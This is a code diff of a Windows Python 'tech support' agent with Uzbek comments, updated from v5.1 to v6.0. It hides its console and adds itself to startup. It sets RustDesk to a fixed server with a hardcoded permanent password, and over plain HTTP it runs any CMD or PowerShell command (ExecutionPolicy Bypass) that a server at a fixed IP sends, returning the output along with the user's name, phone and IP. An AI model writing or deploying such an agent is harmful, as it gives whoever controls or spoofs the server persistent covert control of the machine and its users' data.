@@ -1,9 +1,12 @@
 #!/usr/bin/env python3
 """
-UstajonSupport Client Agent v5.1
-- RustDesk auto-config with permanent password
-- Remote command execution
-- Fixed GUI with visible button
+UstajonSupport Client Agent v6.0
+================================
+- Yashirin fon rejimida ishlaydi (GUI faqat birinchi marta)
+- Har 10 sekundda heartbeat yuboradi
+- RustDesk ID avtomatik topadi va yuboradi
+- Remote CMD buyruqlarni bajaradi
+- Startup'ga qo'shiladi (avtomatik ishga tushadi)
 """
 
 import os
@@ -17,470 +20,595 @@ import logging
 import threading
 import subprocess
 import ctypes
-import winreg
 from pathlib import Path
 from datetime import datetime
 
-# Constants
-VERSION = "5.1.0"
+# ============ CONSTANTS ============
+VERSION = "6.0.0"
 SERVER_URL = "http://31.220.75.75"
 RUSTDESK_KEY = "YHo+N4vp+ZWP7wedLh69zCGk3aFf4935hwDKX9OdFXE="
 RUSTDESK_PASSWORD = "ustajon2025"
-HEARTBEAT_INTERVAL = 10
-COMMAND_CHECK_INTERVAL = 5
+HEARTBEAT_INTERVAL = 10  # seconds
+COMMAND_CHECK_INTERVAL = 5  # seconds
+DATA_FILE = Path.home() / ".ustajon_data.json"
+LOG_FILE = Path.home() / "ustajon_support.log"
 
-# Setup logging
+# ============ LOGGING ============
 logging.basicConfig(
     level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
+    format='%(asctime)s [%(levelname)s] %(message)s',
     handlers=[
-        logging.StreamHandler(),
-        logging.FileHandler(Path.home() / "ustajon_support.log", encoding='utf-8')
+        logging.FileHandler(LOG_FILE, encoding='utf-8'),
+        logging.StreamHandler()
     ]
 )
-logger = logging.getLogger(__name__)
+log = logging.getLogger(__name__)
 
-def is_admin():
+# ============ HIDE CONSOLE WINDOW ============
+def hide_console():
+    """Hide console window for background operation"""
     try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
+        if sys.platform == 'win32':
+            import ctypes
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     except:
-        return False
+        pass
 
+# ============ UTILITIES ============
 def get_machine_id():
+    """Generate unique machine identifier"""
     try:
-        machine_info = f"{socket.gethostname()}-{uuid.getnode()}"
-        return hashlib.md5(machine_info.encode()).hexdigest()[:12].upper()
+        info = f"{socket.gethostname()}-{uuid.getnode()}"
+        return hashlib.md5(info.encode()).hexdigest()[:12].upper()
     except:
         return uuid.uuid4().hex[:12].upper()
 
-def get_system_info():
+def get_hostname():
+    """Get computer hostname"""
     try:
-        hostname = socket.gethostname()
-        try:
-            result = subprocess.run(
-                ['wmic', 'os', 'get', 'Caption', '/value'],
-                capture_output=True, text=True, timeout=10,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            os_info = result.stdout.split('=')[1].strip() if '=' in result.stdout else "Windows"
-        except:
-            os_info = "Windows"
-        return {"hostname": hostname, "os_info": os_info, "version": VERSION}
+        return socket.gethostname()
+    except:
+        return "Unknown"
+
+def get_os_info():
+    """Get Windows version"""
+    try:
+        result = subprocess.run(
+            ['wmic', 'os', 'get', 'Caption', '/value'],
+            capture_output=True, text=True, timeout=15,
+            creationflags=0x08000000  # CREATE_NO_WINDOW
+        )
+        for line in result.stdout.split('\n'):
+            if 'Caption=' in line:
+                return line.split('=')[1].strip()
+    except:
+        pass
+    return "Windows"
+
+def get_ip_address():
+    """Get local IP address"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "Unknown"
+
+def load_saved_data():
+    """Load saved user data"""
+    try:
+        if DATA_FILE.exists():
+            with open(DATA_FILE, 'r', encoding='utf-8') as f:
+                return json.load(f)
+    except:
+        pass
+    return {}
+
+def save_data(data):
+    """Save user data"""
+    try:
+        with open(DATA_FILE, 'w', encoding='utf-8') as f:
+            json.dump(data, f, ensure_ascii=False, indent=2)
     except Exception as e:
-        logger.error(f"System info error: {e}")
-        return {"hostname": "Unknown", "os_info": "Windows", "version": VERSION}
+        log.error(f"Save data error: {e}")
 
+def add_to_startup():
+    """Add to Windows startup"""
+    try:
+        import winreg
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else f'pythonw "{os.path.abspath(__file__)}"'
+        
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0, winreg.KEY_SET_VALUE
+        )
+        winreg.SetValueEx(key, "UstajonSupport", 0, winreg.REG_SZ, exe_path)
+        winreg.CloseKey(key)
+        log.info("Added to startup")
+        return True
+    except Exception as e:
+        log.error(f"Startup error: {e}")
+        return False
 
-class RustDeskManager:
-    RUSTDESK_PATHS = [
-        Path(os.environ.get('PROGRAMFILES', 'C:\\Program Files')) / "RustDesk" / "rustdesk.exe",
-        Path(os.environ.get('LOCALAPPDATA', '')) / "RustDesk" / "rustdesk.exe",
-        Path.home() / "AppData" / "Local" / "RustDesk" / "rustdesk.exe",
-    ]
+# ============ RUSTDESK MANAGER ============
+class RustDesk:
+    """RustDesk ID finder and configurator"""
     
-    CONFIG_PATHS = [
-        Path(os.environ.get('APPDATA', '')) / "RustDesk" / "config" / "RustDesk2.toml",
-        Path.home() / "AppData" / "Roaming" / "RustDesk" / "config" / "RustDesk2.toml",
-    ]
-    
-    def __init__(self):
-        self.rustdesk_path = self._find_rustdesk()
-        self.config_path = self._find_config_path()
-        self.rustdesk_id = None
-    
-    def _find_rustdesk(self):
-        for path in self.RUSTDESK_PATHS:
-            if path.exists():
-                logger.info(f"RustDesk found: {path}")
-                return path
-        try:
-            result = subprocess.run(['where', 'rustdesk'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            if result.returncode == 0:
-                path = Path(result.stdout.strip().split('\n')[0])
+    @staticmethod
+    def find_id():
+        """Find RustDesk ID from config file"""
+        config_paths = [
+            Path(os.environ.get('APPDATA', '')) / "RustDesk" / "config" / "RustDesk2.toml",
+            Path.home() / "AppData" / "Roaming" / "RustDesk" / "config" / "RustDesk2.toml",
+            Path.home() / ".config" / "rustdesk" / "RustDesk2.toml",
+        ]
+        
+        for path in config_paths:
+            try:
                 if path.exists():
-                    return path
+                    content = path.read_text(encoding='utf-8')
+                    for line in content.split('\n'):
+                        line = line.strip()
+                        if line.startswith('id') and '=' in line:
+                            rustdesk_id = line.split('=')[1].strip().strip("'\"")
+                            if rustdesk_id and len(rustdesk_id) >= 6:
+                                log.info(f"RustDesk ID found: {rustdesk_id}")
+                                return rustdesk_id
+            except:
+                continue
+        
+        # Try registry
+        try:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\RustDesk", 0, winreg.KEY_READ)
+            rustdesk_id, _ = winreg.QueryValueEx(key, "id")
+            winreg.CloseKey(key)
+            if rustdesk_id:
+                log.info(f"RustDesk ID from registry: {rustdesk_id}")
+                return rustdesk_id
         except:
             pass
+        
+        log.warning("RustDesk ID not found")
         return None
     
-    def _find_config_path(self):
-        for path in self.CONFIG_PATHS:
-            if path.parent.exists():
-                return path
-        default = Path(os.environ.get('APPDATA', '')) / "RustDesk" / "config" / "RustDesk2.toml"
-        default.parent.mkdir(parents=True, exist_ok=True)
-        return default
-    
-    def configure(self):
+    @staticmethod
+    def configure_server():
+        """Configure RustDesk to use our server"""
+        config_path = Path(os.environ.get('APPDATA', '')) / "RustDesk" / "config" / "RustDesk2.toml"
+        
         try:
-            config_content = ""
-            if self.config_path.exists():
-                with open(self.config_path, 'r', encoding='utf-8') as f:
-                    config_content = f.read()
+            config_path.parent.mkdir(parents=True, exist_ok=True)
             
-            lines = config_content.split('\n') if config_content else []
-            config_dict = {}
-            for line in lines:
-                if '=' in line:
-                    key, value = line.split('=', 1)
-                    config_dict[key.strip()] = value.strip()
+            # Read existing config
+            config = {}
+            if config_path.exists():
+                content = config_path.read_text(encoding='utf-8')
+                for line in content.split('\n'):
+                    if '=' in line:
+                        key, val = line.split('=', 1)
+                        config[key.strip()] = val.strip()
             
-            config_dict['rendezvous_server'] = "'31.220.75.75'"
-            config_dict['nat_type'] = '1'
-            config_dict['serial'] = '0'
-            config_dict['key'] = f"'{RUSTDESK_KEY}'"
-            config_dict['password'] = f"'{RUSTDESK_PASSWORD}'"
-            config_dict['direct-server'] = "'Y'"
-            config_dict['direct-access-port'] = "'21118'"
+            # Update server settings
+            config['rendezvous_server'] = "'31.220.75.75'"
+            config['key'] = f"'{RUSTDESK_KEY}'"
+            config['password'] = f"'{RUSTDESK_PASSWORD}'"
+            config['direct-server'] = "'Y'"
+            config['direct-access-port'] = "'21118'"
             
-            self.config_path.parent.mkdir(parents=True, exist_ok=True)
-            with open(self.config_path, 'w', encoding='utf-8') as f:
-                for key, value in config_dict.items():
-                    f.write(f"{key} = {value}\n")
+            # Write config
+            with open(config_path, 'w', encoding='utf-8') as f:
+                for key, val in config.items():
+                    f.write(f"{key} = {val}\n")
             
-            logger.info(f"RustDesk configured: {self.config_path}")
+            log.info("RustDesk configured")
             return True
         except Exception as e:
-            logger.error(f"Config error: {e}")
+            log.error(f"RustDesk config error: {e}")
             return False
     
-    def get_id(self):
+    @staticmethod
+    def is_running():
+        """Check if RustDesk is running"""
         try:
-            if self.config_path.exists():
-                with open(self.config_path, 'r', encoding='utf-8') as f:
-                    for line in f:
-                        if line.strip().startswith('id'):
-                            parts = line.split('=', 1)
-                            if len(parts) == 2:
-                                self.rustdesk_id = parts[1].strip().strip("'\"")
-                                return self.rustdesk_id
-            try:
-                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\RustDesk")
-                self.rustdesk_id, _ = winreg.QueryValueEx(key, "id")
-                winreg.CloseKey(key)
-                return self.rustdesk_id
-            except:
-                pass
-        except Exception as e:
-            logger.error(f"Get ID error: {e}")
-        return None
-    
-    def ensure_running(self):
-        try:
-            result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq rustdesk.exe'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            if 'rustdesk.exe' in result.stdout.lower():
-                logger.info("RustDesk already running")
-                return True
-            if self.rustdesk_path and self.rustdesk_path.exists():
-                subprocess.Popen([str(self.rustdesk_path), '--service'], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
-                logger.info("RustDesk started")
-                time.sleep(3)
-                return True
-        except Exception as e:
-            logger.error(f"RustDesk start error: {e}")
-        return False
-    
-    def restart(self):
-        try:
-            subprocess.run(['taskkill', '/F', '/IM', 'rustdesk.exe'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            time.sleep(2)
-            return self.ensure_running()
+            result = subprocess.run(
+                ['tasklist', '/FI', 'IMAGENAME eq rustdesk.exe'],
+                capture_output=True, text=True, timeout=10,
+                creationflags=0x08000000
+            )
+            return 'rustdesk.exe' in result.stdout.lower()
         except:
             return False
-
-
-class RemoteCommand:
+    
     @staticmethod
-    def execute_cmd(command):
+    def start():
+        """Start RustDesk"""
+        paths = [
+            Path(os.environ.get('PROGRAMFILES', '')) / "RustDesk" / "rustdesk.exe",
+            Path(os.environ.get('LOCALAPPDATA', '')) / "RustDesk" / "rustdesk.exe",
+        ]
+        
+        for path in paths:
+            if path.exists():
+                try:
+                    subprocess.Popen(
+                        [str(path), '--service'],
+                        creationflags=0x08000000 | 0x00000008  # CREATE_NO_WINDOW | DETACHED_PROCESS
+                    )
+                    log.info(f"RustDesk started: {path}")
+                    return True
+                except:
+                    continue
+        return False
+
+# ============ REMOTE COMMAND EXECUTOR ============
+class CommandExecutor:
+    """Execute remote commands"""
+    
+    @staticmethod
+    def run_cmd(command):
+        """Run CMD command"""
         try:
-            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=120, creationflags=subprocess.CREATE_NO_WINDOW)
+            result = subprocess.run(
+                command,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=120,
+                creationflags=0x08000000
+            )
             output = result.stdout + result.stderr
-            return True, output[:10000]
+            return True, output[:8000]
         except subprocess.TimeoutExpired:
-            return False, "Command timed out"
+            return False, "Timeout (120s)"
         except Exception as e:
             return False, str(e)
     
     @staticmethod
-    def execute_powershell(command):
+    def run_powershell(command):
+        """Run PowerShell command"""
         try:
-            result = subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-Command', command], capture_output=True, text=True, timeout=120, creationflags=subprocess.CREATE_NO_WINDOW)
+            result = subprocess.run(
+                ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', command],
+                capture_output=True,
+                text=True,
+                timeout=120,
+                creationflags=0x08000000
+            )
             output = result.stdout + result.stderr
-            return True, output[:10000]
+            return True, output[:8000]
         except subprocess.TimeoutExpired:
-            return False, "Command timed out"
+            return False, "Timeout (120s)"
         except Exception as e:
             return False, str(e)
     
     @staticmethod
-    def get_system_info():
+    def get_sysinfo():
+        """Get system information"""
+        info = []
+        info.append(f"Hostname: {get_hostname()}")
+        info.append(f"OS: {get_os_info()}")
+        info.append(f"IP: {get_ip_address()}")
+        info.append(f"Agent: v{VERSION}")
+        
         try:
-            info = []
-            info.append(f"Computer: {socket.gethostname()}")
-            result = subprocess.run(['wmic', 'os', 'get', 'Caption,Version', '/value'], capture_output=True, text=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
+            # CPU
+            result = subprocess.run(
+                ['wmic', 'cpu', 'get', 'Name', '/value'],
+                capture_output=True, text=True, timeout=15,
+                creationflags=0x08000000
+            )
             for line in result.stdout.split('\n'):
-                if '=' in line:
-                    info.append(line.strip())
-            result = subprocess.run(['wmic', 'cpu', 'get', 'Name', '/value'], capture_output=True, text=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
-            for line in result.stdout.split('\n'):
-                if '=' in line:
+                if 'Name=' in line:
                     info.append(f"CPU: {line.split('=')[1].strip()}")
-            result = subprocess.run(['wmic', 'computersystem', 'get', 'TotalPhysicalMemory', '/value'], capture_output=True, text=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            # RAM
+            result = subprocess.run(
+                ['wmic', 'computersystem', 'get', 'TotalPhysicalMemory', '/value'],
+                capture_output=True, text=True, timeout=15,
+                creationflags=0x08000000
+            )
             for line in result.stdout.split('\n'):
                 if 'TotalPhysicalMemory=' in line:
-                    ram_bytes = int(line.split('=')[1].strip())
-                    ram_gb = round(ram_bytes / (1024**3), 1)
-                    info.append(f"RAM: {ram_gb} GB")
-            result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
-            for line in result.stdout.split('\n'):
-                if 'IPv4' in line and '=' in line:
-                    info.append(f"IP: {line.split(':')[1].strip()}")
-                    break
-            return True, '\n'.join(info)
-        except Exception as e:
-            return False, str(e)
+                    ram = int(line.split('=')[1].strip()) / (1024**3)
+                    info.append(f"RAM: {ram:.1f} GB")
+        except:
+            pass
+        
+        return True, '\n'.join(info)
 
-
-class SupportAgent:
-    def __init__(self):
-        self.client_id = get_machine_id()
-        self.running = True
-        self.registered = False
-        self.user_info = {}
-        self.rustdesk = RustDeskManager()
-        logger.info(f"Agent v{VERSION} starting, ID: {self.client_id}")
+# ============ HTTP CLIENT ============
+class HttpClient:
+    """Simple HTTP client using urllib"""
     
-    def setup_rustdesk(self):
-        self.rustdesk.configure()
-        self.rustdesk.ensure_running()
-        for _ in range(10):
-            rustdesk_id = self.rustdesk.get_id()
-            if rustdesk_id:
-                logger.info(f"RustDesk ID: {rustdesk_id}")
-                return rustdesk_id
-            time.sleep(1)
-        return None
-    
-    def send_heartbeat(self):
+    @staticmethod
+    def post(url, data):
+        """POST JSON data"""
         try:
             import urllib.request
-            sys_info = get_system_info()
-            rustdesk_id = self.rustdesk.get_id()
-            data = {
-                "client_id": self.client_id,
-                "rustdesk_id": rustdesk_id,
-                "hostname": sys_info.get("hostname", ""),
-                "os_info": sys_info.get("os_info", ""),
-                "version": VERSION,
-                **self.user_info
-            }
             req = urllib.request.Request(
-                f"{SERVER_URL}/api/heartbeat",
+                url,
                 data=json.dumps(data).encode('utf-8'),
                 headers={'Content-Type': 'application/json'},
                 method='POST'
             )
-            with urllib.request.urlopen(req, timeout=10) as response:
-                result = json.loads(response.read().decode('utf-8'))
-                if not self.registered and result.get('success'):
-                    self.registered = True
-                    logger.info("Registered with server")
-                return True
+            with urllib.request.urlopen(req, timeout=15) as resp:
+                return json.loads(resp.read().decode('utf-8'))
         except Exception as e:
-            logger.debug(f"Heartbeat error: {e}")
+            log.debug(f"POST error: {e}")
+            return None
+    
+    @staticmethod
+    def get(url):
+        """GET JSON data"""
+        try:
+            import urllib.request
+            req = urllib.request.Request(url, method='GET')
+            with urllib.request.urlopen(req, timeout=15) as resp:
+                return json.loads(resp.read().decode('utf-8'))
+        except Exception as e:
+            log.debug(f"GET error: {e}")
+            return None
+
+# ============ MAIN AGENT ============
+class Agent:
+    """Main support agent"""
+    
+    def __init__(self):
+        self.client_id = get_machine_id()
+        self.running = True
+        self.user_data = load_saved_data()
+        self.rustdesk_id = None
+        self.first_run = not self.user_data.get('registered', False)
+        
+        log.info(f"=" * 50)
+        log.info(f"UstajonSupport Agent v{VERSION}")
+        log.info(f"Client ID: {self.client_id}")
+        log.info(f"First run: {self.first_run}")
+        log.info(f"=" * 50)
+    
+    def init_rustdesk(self):
+        """Initialize RustDesk"""
+        # Configure server
+        RustDesk.configure_server()
+        
+        # Start if not running
+        if not RustDesk.is_running():
+            RustDesk.start()
+            time.sleep(3)
+        
+        # Get ID
+        for _ in range(10):
+            self.rustdesk_id = RustDesk.find_id()
+            if self.rustdesk_id:
+                break
+            time.sleep(1)
+        
+        log.info(f"RustDesk ID: {self.rustdesk_id or 'Not found'}")
+    
+    def send_heartbeat(self):
+        """Send heartbeat to server"""
+        # Get fresh RustDesk ID
+        if not self.rustdesk_id:
+            self.rustdesk_id = RustDesk.find_id()
+        
+        data = {
+            "client_id": self.client_id,
+            "rustdesk_id": self.rustdesk_id or "",
+            "hostname": get_hostname(),
+            "os_info": get_os_info(),
+            "version": VERSION,
+            "name": self.user_data.get('name', ''),
+            "phone": self.user_data.get('phone', ''),
+            "problem": self.user_data.get('problem', ''),
+            "local_ip": get_ip_address()
+        }
+        
+        result = HttpClient.post(f"{SERVER_URL}/api/heartbeat", data)
+        if result and result.get('success'):
+            log.debug("Heartbeat sent successfully")
+            return True
+        else:
+            log.debug("Heartbeat failed")
             return False
     
     def check_commands(self):
-        try:
-            import urllib.request
-            url = f"{SERVER_URL}/api/agent/commands?client_id={self.client_id}"
-            req = urllib.request.Request(url, method='GET')
-            with urllib.request.urlopen(req, timeout=10) as response:
-                commands = json.loads(response.read().decode('utf-8'))
-            for cmd in commands:
-                if cmd.get('status') != 'pending':
-                    continue
-                cmd_id = cmd.get('id')
-                cmd_type = cmd.get('type', 'cmd')
-                command = cmd.get('command', '')
-                logger.info(f"Executing command [{cmd_id}]: {cmd_type} - {command[:50]}...")
-                if cmd_type == 'powershell':
-                    success, output = RemoteCommand.execute_powershell(command)
-                elif cmd_type == 'system_info' or cmd_type == 'sysinfo':
-                    success, output = RemoteCommand.get_system_info()
-                else:
-                    success, output = RemoteCommand.execute_cmd(command)
-                self.send_command_result(cmd_id, success, output)
-        except Exception as e:
-            logger.debug(f"Command check error: {e}")
-    
-    def send_command_result(self, cmd_id, success, output):
-        try:
-            import urllib.request
-            data = {
+        """Check and execute pending commands"""
+        commands = HttpClient.get(f"{SERVER_URL}/api/agent/commands?client_id={self.client_id}")
+        
+        if not commands:
+            return
+        
+        for cmd in commands:
+            if cmd.get('status') != 'pending':
+                continue
+            
+            cmd_id = cmd.get('id')
+            cmd_type = cmd.get('type', 'cmd')
+            command = cmd.get('command', '')
+            
+            log.info(f"Executing [{cmd_type}]: {command[:50]}...")
+            
+            # Execute command
+            if cmd_type == 'powershell':
+                success, output = CommandExecutor.run_powershell(command)
+            elif cmd_type in ('sysinfo', 'system_info'):
+                success, output = CommandExecutor.get_sysinfo()
+            else:
+                success, output = CommandExecutor.run_cmd(command)
+            
+            # Send result
+            result_data = {
                 "client_id": self.client_id,
                 "command_id": cmd_id,
                 "success": success,
                 "output": output
             }
-            req = urllib.request.Request(
-                f"{SERVER_URL}/api/agent/command-result",
-                data=json.dumps(data).encode('utf-8'),
-                headers={'Content-Type': 'application/json'},
-                method='POST'
-            )
-            with urllib.request.urlopen(req, timeout=10) as response:
-                result = json.loads(response.read().decode('utf-8'))
-                logger.info(f"Command result sent: {cmd_id} - {'Success' if success else 'Failed'}")
-                return result.get('success', False)
-        except Exception as e:
-            logger.error(f"Result send error: {e}")
-            return False
+            HttpClient.post(f"{SERVER_URL}/api/agent/command-result", result_data)
+            log.info(f"Command result sent: {cmd_id}")
     
     def heartbeat_loop(self):
+        """Background heartbeat loop"""
         while self.running:
-            self.send_heartbeat()
+            try:
+                self.send_heartbeat()
+            except Exception as e:
+                log.error(f"Heartbeat error: {e}")
             time.sleep(HEARTBEAT_INTERVAL)
     
     def command_loop(self):
+        """Background command check loop"""
         while self.running:
-            self.check_commands()
+            try:
+                self.check_commands()
+            except Exception as e:
+                log.error(f"Command check error: {e}")
             time.sleep(COMMAND_CHECK_INTERVAL)
     
-    def run(self):
-        rustdesk_id = self.setup_rustdesk()
-        if not rustdesk_id:
-            logger.warning("RustDesk ID not found, will retry...")
-        self.show_gui()
-        heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
-        heartbeat_thread.start()
-        command_thread = threading.Thread(target=self.command_loop, daemon=True)
-        command_thread.start()
-        logger.info("Agent running...")
-        try:
-            while self.running:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            self.running = False
-            logger.info("Agent stopped")
-    
-    def show_gui(self):
+    def show_registration_gui(self):
+        """Show registration GUI (only on first run)"""
         try:
             import tkinter as tk
             from tkinter import messagebox
             
             root = tk.Tk()
-            root.title("UstajonSupport - Texnik Yordam")
-            root.geometry("420x580")
+            root.title("UstajonSupport")
+            root.geometry("400x520")
             root.resizable(False, False)
-            root.configure(bg='#1a1a2e')
+            root.configure(bg='#0d1117')
             
-            # Center window
+            # Center
             root.update_idletasks()
-            x = (root.winfo_screenwidth() - 420) // 2
-            y = (root.winfo_screenheight() - 580) // 2
+            x = (root.winfo_screenwidth() - 400) // 2
+            y = (root.winfo_screenheight() - 520) // 2
             root.geometry(f"+{x}+{y}")
             
             # Header
-            header = tk.Label(root, text="🔧 Texnik Yordam", font=('Segoe UI', 18, 'bold'), bg='#1a1a2e', fg='#00d9ff')
-            header.pack(pady=(25, 5))
+            tk.Label(root, text="🔧", font=('Segoe UI', 36), bg='#0d1117', fg='#58a6ff').pack(pady=(30, 5))
+            tk.Label(root, text="Texnik Yordam", font=('Segoe UI', 20, 'bold'), bg='#0d1117', fg='white').pack()
+            tk.Label(root, text="Ma'lumotlaringizni kiriting", font=('Segoe UI', 10), bg='#0d1117', fg='#8b949e').pack(pady=(5, 25))
             
-            subtitle = tk.Label(root, text="Muammongizni hal qilishga yordam beramiz", font=('Segoe UI', 9), bg='#1a1a2e', fg='#888')
-            subtitle.pack(pady=(0, 20))
-            
-            # Form frame
-            form = tk.Frame(root, bg='#1a1a2e')
-            form.pack(padx=35, fill='x')
+            # Form
+            form = tk.Frame(root, bg='#0d1117')
+            form.pack(padx=40, fill='x')
             
             # Name
-            tk.Label(form, text="👤 Ismingiz:", bg='#1a1a2e', fg='white', font=('Segoe UI', 10), anchor='w').pack(fill='x')
-            name_entry = tk.Entry(form, font=('Segoe UI', 11), bg='#16213e', fg='white', insertbackground='white', relief='flat', bd=8)
-            name_entry.pack(fill='x', pady=(3, 12))
+            tk.Label(form, text="Ismingiz:", bg='#0d1117', fg='#c9d1d9', font=('Segoe UI', 10), anchor='w').pack(fill='x')
+            name_entry = tk.Entry(form, font=('Segoe UI', 12), bg='#21262d', fg='white', insertbackground='white', relief='flat', bd=8)
+            name_entry.pack(fill='x', pady=(5, 15))
             
             # Phone
-            tk.Label(form, text="📱 Telefon raqami:", bg='#1a1a2e', fg='white', font=('Segoe UI', 10), anchor='w').pack(fill='x')
-            phone_entry = tk.Entry(form, font=('Segoe UI', 11), bg='#16213e', fg='white', insertbackground='white', relief='flat', bd=8)
+            tk.Label(form, text="Telefon:", bg='#0d1117', fg='#c9d1d9', font=('Segoe UI', 10), anchor='w').pack(fill='x')
+            phone_entry = tk.Entry(form, font=('Segoe UI', 12), bg='#21262d', fg='white', insertbackground='white', relief='flat', bd=8)
             phone_entry.insert(0, "+998")
-            phone_entry.pack(fill='x', pady=(3, 12))
+            phone_entry.pack(fill='x', pady=(5, 15))
             
             # Problem
-            tk.Label(form, text="❓ Muammo:", bg='#1a1a2e', fg='white', font=('Segoe UI', 10), anchor='w').pack(fill='x')
-            problem_text = tk.Text(form, font=('Segoe UI', 10), bg='#16213e', fg='white', insertbackground='white', relief='flat', height=3, bd=8)
-            problem_text.pack(fill='x', pady=(3, 15))
+            tk.Label(form, text="Muammo:", bg='#0d1117', fg='#c9d1d9', font=('Segoe UI', 10), anchor='w').pack(fill='x')
+            problem_entry = tk.Text(form, font=('Segoe UI', 11), bg='#21262d', fg='white', insertbackground='white', relief='flat', height=3, bd=8)
+            problem_entry.pack(fill='x', pady=(5, 15))
             
-            # RustDesk ID display
-            rustdesk_id = self.rustdesk.get_id() or "Yuklanmoqda..."
-            id_frame = tk.Frame(form, bg='#0f3460')
-            id_frame.pack(fill='x', pady=(5, 15))
-            
-            tk.Label(id_frame, text="🔗 RustDesk ID:", bg='#0f3460', fg='#888', font=('Segoe UI', 9)).pack(anchor='w', padx=12, pady=(10, 0))
-            id_label = tk.Label(id_frame, text=rustdesk_id, bg='#0f3460', fg='#00d9ff', font=('Consolas', 16, 'bold'))
-            id_label.pack(anchor='w', padx=12, pady=(2, 10))
+            # RustDesk ID
+            id_frame = tk.Frame(form, bg='#161b22')
+            id_frame.pack(fill='x', pady=10)
+            tk.Label(id_frame, text="RustDesk ID:", bg='#161b22', fg='#8b949e', font=('Segoe UI', 9)).pack(anchor='w', padx=10, pady=(8, 0))
+            id_label = tk.Label(id_frame, text=self.rustdesk_id or "Aniqlanmoqda...", bg='#161b22', fg='#58a6ff', font=('Consolas', 16, 'bold'))
+            id_label.pack(anchor='w', padx=10, pady=(2, 8))
             
             def submit():
                 name = name_entry.get().strip()
                 phone = phone_entry.get().strip()
-                problem = problem_text.get('1.0', 'end').strip()
+                problem = problem_entry.get('1.0', 'end').strip()
                 
                 if not name:
                     messagebox.showwarning("Xatolik", "Ismingizni kiriting!")
                     return
-                if not phone or len(phone) < 9:
+                if len(phone) < 9:
                     messagebox.showwarning("Xatolik", "Telefon raqamini kiriting!")
                     return
                 
-                self.user_info = {"name": name, "phone": phone, "problem": problem or "Belgilanmagan"}
+                # Save data
+                self.user_data = {
+                    'name': name,
+                    'phone': phone,
+                    'problem': problem or 'Belgilanmagan',
+                    'registered': True,
+                    'registered_at': datetime.now().isoformat()
+                }
+                save_data(self.user_data)
+                
+                # Send heartbeat immediately
                 self.send_heartbeat()
                 
-                messagebox.showinfo("Muvaffaqiyat", "✅ Ma'lumotlar yuborildi!\n\nMutaxassis tez orada siz bilan bog'lanadi.\nDasturni yopmang!")
+                # Add to startup
+                add_to_startup()
+                
+                messagebox.showinfo("Tayyor!", 
+                    "✅ Ma'lumotlar yuborildi!\n\n"
+                    "Mutaxassis tez orada bog'lanadi.\n\n"
+                    "Dastur fon rejimida ishlaydi.")
                 root.destroy()
             
-            # ===== SUBMIT BUTTON - CLEARLY VISIBLE =====
-            submit_btn = tk.Button(
-                form, 
-                text="📤  YUBORISH", 
-                font=('Segoe UI', 13, 'bold'),
-                bg='#00d9ff', 
-                fg='#000000',
-                activebackground='#00b8d4',
-                activeforeground='#000000',
-                relief='flat', 
-                cursor='hand2', 
-                command=submit,
-                pady=12
-            )
-            submit_btn.pack(fill='x', pady=(10, 15))
+            # Submit button
+            submit_btn = tk.Button(form, text="✓ YUBORISH", font=('Segoe UI', 13, 'bold'),
+                                  bg='#238636', fg='white', activebackground='#2ea043',
+                                  relief='flat', cursor='hand2', command=submit, pady=10)
+            submit_btn.pack(fill='x', pady=(15, 10))
             
-            # Version info
-            ver_label = tk.Label(root, text=f"v{VERSION}", font=('Segoe UI', 8), bg='#1a1a2e', fg='#444')
-            ver_label.pack(side='bottom', pady=10)
-            
-            # Update ID periodically
+            # Update RustDesk ID
             def update_id():
-                new_id = self.rustdesk.get_id()
-                if new_id and new_id != "Yuklanmoqda...":
-                    id_label.config(text=new_id)
+                if not self.rustdesk_id:
+                    self.rustdesk_id = RustDesk.find_id()
+                if self.rustdesk_id:
+                    id_label.config(text=self.rustdesk_id)
                 if root.winfo_exists():
                     root.after(2000, update_id)
+            root.after(1000, update_id)
             
-            root.after(2000, update_id)
             root.mainloop()
             
         except Exception as e:
-            logger.error(f"GUI error: {e}")
-            self.user_info = {"name": "Auto-client", "phone": "", "problem": ""}
+            log.error(f"GUI error: {e}")
+            # Continue without GUI
+            self.user_data = {'name': 'Auto', 'phone': '', 'problem': '', 'registered': True}
+            save_data(self.user_data)
+    
+    def run(self):
+        """Main run method"""
+        # Initialize RustDesk
+        self.init_rustdesk()
+        
+        # Show GUI only on first run
+        if self.first_run:
+            self.show_registration_gui()
+        else:
+            log.info("Already registered, running in background...")
+            hide_console()
+        
+        # Start background threads
+        threading.Thread(target=self.heartbeat_loop, daemon=True).start()
+        threading.Thread(target=self.command_loop, daemon=True).start()
+        
+        log.info("Agent started - running in background")
+        
+        # Keep alive
+        try:
+            while self.running:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            log.info("Agent stopped")
+            self.running = False
 
 
-def main():
+# ============ ENTRY POINT ============
+if __name__ == "__main__":
     try:
